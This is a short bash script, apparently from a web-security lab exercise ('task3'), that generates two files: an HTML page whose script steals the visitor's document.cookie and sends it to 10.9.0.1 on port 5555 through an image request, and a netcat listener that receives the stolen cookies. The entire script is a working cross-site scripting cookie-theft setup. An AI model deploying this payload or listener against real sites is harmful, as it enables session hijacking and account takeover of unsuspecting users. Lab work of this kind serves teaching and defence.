#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")"

cat > task3_payload.html <<'EOF'
<script>
document.write('<img src="http://10.9.0.1:5555?c=' + escape(document.cookie) + '">');
</script>
EOF

cat > task3_listener.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

nc -lnv 5555
EOF

chmod +x task3_listener.sh

printf 'Gerados: task3_payload.html, task3_listener.sh\n'
